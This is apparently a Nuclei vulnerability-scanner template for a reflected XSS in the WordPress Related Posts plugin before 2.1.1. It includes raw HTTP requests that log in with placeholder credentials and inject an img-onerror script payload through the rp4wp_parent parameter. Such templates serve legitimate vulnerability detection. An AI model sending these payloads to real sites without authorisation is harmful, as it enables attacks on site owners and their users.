# Nuclei Template: WordPress Related Posts <= 2.1.1 - Cross Site Scripting
**Template ID:** wp-related-post-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`wp-related-post-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Related Posts plugin before 2.1.1 contains an Reflected XSS via rp4wp_parent

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

GET /wp-admin/admin.php?page=rp4wp_link_related&rp4wp_parent=156x%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E HTTP/1.1
Host: {{Hostname}}
```

## References
- https://huntr.dev/bounties/7c9bd2d2-2a6f-420c-a45e-716600cf810e/
- https://wordpress.org/plugins/wordpress-23-related-posts-plugin/advanced/
